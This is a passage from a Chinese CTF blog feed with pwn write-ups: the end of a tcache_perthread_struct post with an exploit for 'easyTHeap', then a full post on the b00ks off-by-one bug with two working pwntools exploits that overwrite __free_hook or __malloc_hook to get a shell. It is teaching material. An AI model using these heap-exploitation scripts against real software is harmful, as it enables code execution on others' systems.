alt="image-20210418133641326"></p><p>我们也可以同过其他tache漏洞，使我们获得更改此处的权利。就可以让某大小计数大于<code>TCACHE_FILL_COUNT</code>（从而假造tache已满的情况泄露libc）。也可以篡改<code>entries</code>中保存的指针指向任意地方。</p><h4 id="例题：-V-amp-N2020-公开赛-easyTHeap"><a href="#例题：-V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="例题：[V&amp;N2020 公开赛]easyTHeap"></a>例题：[V&amp;N2020 公开赛]easyTHeap</h4><p>题目限制了只能free3次和malloc 7次任意大小chunk。</p><p>利用二次释放在<code>tcache_perthread_struct</code>处，创造fack chunk。从而修改<code>tcache_perthread_struct</code>的值将假造tache已满的情况。从而free出libc。</p><p>再改<code>tcache_perthread_struct</code>的entries区域的内容，使某一大小的bin的指针变成我们fack chunk的指针从而改写<code>__realloc_hook</code>与<code>__moalloc_hook</code>，从而执行one_gadget.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line">p=process(<span class="string">'./vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"><span class="comment">#p.recvuntil('choice')</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.sendline((text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">log.info(<span class="string">'tcache struct:'</span>+hex((addr<span class="number">-0x250</span>)))</span><br><span class="line">edit(<span class="number">1</span>,p64(addr<span class="number">-0x250</span>))</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">3</span>,p8(<span class="number">7</span>)*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex((addr)))</span><br><span class="line">base=addr<span class="number">-0x3afc48</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex((base)))</span><br><span class="line">malloc=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'malloc:'</span>+hex((malloc)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">0x48</span>+p64(malloc<span class="number">-0x20</span>+<span class="number">0xd</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x41612 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x41666 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdeed2 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41666</span>+base)+p64(base+e.symbols[<span class="string">'__libc_realloc'</span>]+<span class="number">0xa</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从对b00k题目学习中初习off-by-one——学pwn小记(7)</title>
      <link href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/"/>
      <url>/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/</url>
      
        <content type="html"><![CDATA[<p> off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节的情况。我看 off-by-one的理论是字字都看得懂，但是一到off-by-one的实际利用时确是不知道怎么办了。于是找了Asis CTF 2016 b00ks这道经典off-by-one题来复现学习。</p><a id="more"></a><h2 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>通过分析题目可以发现，在处理author name这个函数有一个数组越界。</p><p><img src="image-20210409221800526.png" alt="image-20210409221800526"></p><p>仔细观察sub_9F5函数内部细节，可以看到当i=a2，<code>for</code>循环依然会进行一次读取字符操作。导致我们实际读取了a2+1个字符。（即是<code>off-by-one</code> 漏洞）</p><p><img src="image-20210409222059169.png" alt="image-20210409222059169"></p><p>同时通过审计加入书籍的函数，我们发现每加入一本书，有三个chunk被创建，第一个chunk是关于书名的，第二个是关于书的介绍，第三个是书前两个地址的保存。</p><p><img src="image-20210409223627387.png" alt="image-20210409223627387"></p><p>分析删除函数可以看到，只是free的指针和将指向book chunk的指针地址清零并没有清空chunk里的内容。（可能有uaf）</p><p><img src="image-20210409224516738.png" alt="image-20210409224516738"></p><p>分析打印函数，可以看到，在调用时不仅输出了所有的还存在的chunk的book name 与description还输出了author name。</p><p><img src="image-20210409225141070.png" alt="image-20210409225141070"></p><p>同时还发现author name与保存book chunk addr的数组挨得很近：</p><p><img src="image-20210409225844109.png" alt="image-20210409225844109"></p><p>book chunk addr的数组可能被溢出到。经过gdb发现，刚好可以溢出一位<code>\x00</code>到book chunk addr的数组的第一个元素中。</p><p><img src="image-20210409231252054.png" alt="image-20210409231252054"></p><p>又book chunk addr的数组里存放的是book chunk的地址，book chunk里存放着book name chunk和description chunk的地址。故，我们可以在第一本book的description chunk里创造一个伪造是book chunk的fake chunk，然后通过author name溢出的一个<code>\x00</code>让book chunk addr的数组的第一个元素指针变成我们伪造fake chunk。这样我们就控制住了第一个book中book chunk。（但一次程序时只能控制一次）</p><h3 id="利用数组越界得到book1-chunk-addr"><a href="#利用数组越界得到book1-chunk-addr" class="headerlink" title="利用数组越界得到book1 chunk addr"></a>利用数组越界得到book1 chunk addr</h3><p>同时根据上面的分析，我们若在创造程序时，写入了0x20个字符。字符串结尾的’\x00’会在新的一本书创建时覆盖掉。</p><p><img src="image-20210410120812585.png" alt="image-20210410120812585"></p><p>导致我们在输出author book时book1 chunk addr被泄露掉。</p><p><img src="image-20210410120951639.png" alt="image-20210410120951639"></p><p>从而可以推算出任意chunk的地址</p><h3 id="思路1：利用mmap特性leak基地址"><a href="#思路1：利用mmap特性leak基地址" class="headerlink" title="思路1：利用mmap特性leak基地址"></a>思路1：利用mmap特性leak基地址</h3><p>同时由于mmap 在申请一块超级大内存时,会单独映射一块内存而不是从top chunk划分.这个内存地址与libc的基地址的相对地址是不变的.因此我们可以创建在第二个book时用mmap申请两个chunk.再通过fake打印第二个book chunk中保存地址从而获得libc基地址.</p><p><img src="image-20210410113701106.png" alt="image-20210410113701106"></p><p>我们再利用fake chunk的内容修改book2 chunk 的里description chunk地址修改为<code>__free_hook</code>的地址,这样我们在编辑book2 description时,其实是在向<code>__free_hook</code>写入内容.我们可以用此方法写入one_gadget.</p><p>（<code>__free_hook</code>的地址我们可以在gdb中，用<code>x/36gx &amp;__free_hook</code>来找到<code>__free_hook</code>的地址。）</p><p>再通过free来触发。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./b00ks'</span>)</span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">p.sendline(<span class="string">'s'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(ns,na,ds,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(ns))</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,na)</span><br><span class="line">p.sendlineafter(<span class="string">'description size'</span>,str(ds))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"edit"</span>,str(num))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'num'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(name)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露book1 chunk addr</span></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x42000</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x42000</span>,<span class="string">'cba'</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Author: ssssssssssssssssssssssssssssssss'</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book1=u64(x)</span><br><span class="line">book2=book1+<span class="number">0x30</span></span><br><span class="line">log.info(<span class="string">'book1_dr:'</span>+hex(book1))</span><br><span class="line">log.info(<span class="string">'book2_dr:'</span>+hex(book2))</span><br><span class="line"><span class="comment">#通过mmap 泄露出基地址</span></span><br><span class="line">fake=p64(<span class="number">1</span>)+p64(book2+<span class="number">0x8</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0X20</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book2_mmap=u64(x)</span><br><span class="line">log.info(<span class="string">'book2_mmap:'</span>+hex(book2_mmap))</span><br><span class="line">base=book2_mmap<span class="number">-0x590010</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"><span class="comment">#修改book2 chunk 中 description addr 为free hook地址</span></span><br><span class="line"><span class="comment">#并在free hook写入one_gadget</span></span><br><span class="line">free_hook=<span class="number">0x3c67a8</span>+base</span><br><span class="line">log.info(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(base+<span class="number">0x4527a</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="思路2-Fastbin-Attack-泄露libc写入shell"><a href="#思路2-Fastbin-Attack-泄露libc写入shell" class="headerlink" title="思路2: Fastbin Attack 泄露libc写入shell"></a>思路2: Fastbin Attack 泄露libc写入shell</h3><p>审计代码可以发现，程序在释放book时，并没有将所有申请的chunk的内容清空。我们可以申请一个unsorted bin ，再释放掉从而leak出main_arena附近一地址从而算出基地址。在创造一个0x70的fast bin，让其fd能被我们控制写。 再控制fake chunk的让有读能力的book name chunk的地址指向free 出unsorted bin所泄露的地址，有写能力的description chunk的地址指向fast bin的fd。</p><p><img src="image-20210410133403130.png" alt="image-20210410133403130"></p><p>再修改fast bin的fd指向我们在<code>__malloc_hook</code>-0x30+0xd处的falk chunk。</p><p><img src="image-20210410133926118.png" alt="image-20210410133926118"></p><p>由于利用这个新伪造的chunk，本地<code>__malloc_hook</code>写one_gadget没有打通。所以覆盖<code>__realloc_hook</code>及<code>__malloc_hook</code>处的数据。利于<code>__realloc_hook</code>来调节堆栈。</p><p><img src="image-20210410133852514.png" alt="image-20210410133852514"></p><p>于是在<code>__realloc_hook</code>处写one_gadget的地址，在<code>__malloc_hook</code>处写<code>__libc_realloc</code>的地址。</p><p>我们通过gdb 命令 <code>disassemble __libc_realloc</code>来搜寻我们适合的地址。</p><p><img src="image-20210410134609947.png" alt="image-20210410134609947"></p><p>前面几个push的地址我们都可以看情况来选用。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=ELF('./spwnlibc-2.23.so')</span></span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)<span class="comment">#remote('node3.buuoj.cn',29407)</span></span><br><span class="line"><span class="comment">#process('./b00ks')</span></span><br><span class="line">p.sendline(<span class="string">'s'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(ns,na,ds,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(ns))</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,na)</span><br><span class="line">p.sendlineafter(<span class="string">'description size'</span>,str(ds))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"edit"</span>,str(num))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(name)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Author: ssssssssssssssssssssssssssssssss'</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book1=u64(x)</span><br><span class="line">book2=book1+<span class="number">0x30</span></span><br><span class="line">log.info(<span class="string">'book1_dr:'</span>+hex(book1))</span><br><span class="line">log.info(<span class="string">'book2_dr:'</span>+hex(book2))</span><br><span class="line">log.info(<span class="string">'book3_dr:'</span>+hex(book1+<span class="number">0xc0</span>))</span><br><span class="line"><span class="comment">#unsorted bin泄露地址</span></span><br><span class="line">fake=p64(<span class="number">1</span>)+p64(book2+<span class="number">0x8</span>)+p64(book1+<span class="number">0xc0</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">change(<span class="string">'b'</span>*<span class="number">0x20</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">addr=u64(x)</span><br><span class="line">log.info(<span class="string">'bin_addr:'</span>+hex(addr))</span><br><span class="line">base=addr<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line">malloc_hook=<span class="number">0x3c4b10</span>+base</span><br><span class="line">log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line"><span class="comment">#修改fd 让伪造chunk 进入fast bin</span></span><br><span class="line">fake2=p64(malloc_hook<span class="number">-0x30</span>+<span class="number">0xd</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake2)</span><br><span class="line"><span class="comment">#free(3)</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">echo()</span><br><span class="line"><span class="comment">#申请伪造chunk 写入__malloc_hook与__realloc_hook</span></span><br><span class="line">one=base+<span class="number">0x4527a</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line">realloc_addr=base+<span class="number">0x8471d</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="off-by-one的常见点与利用思路"><a href="#off-by-one的常见点与利用思路" class="headerlink" title="off-by-one的常见点与利用思路"></a>off-by-one的常见点与利用思路</h2><p>off-by-one的常见发生在边界验证时：</p><p>1.使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节.</p><p>2.字符串操作判断时。</p><p>off-by-one的常见利用思路：</p><p>1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>        2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14293978.html" target="_blank" rel="noopener">https://www.cnblogs.com/bhxdn/p/14293978.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstromCTF 2021--wp与复现记</title>
      <link href="/2021/04/08/actf--wp/"/>
      <url>/2021/04/08/actf--wp/</url>
      
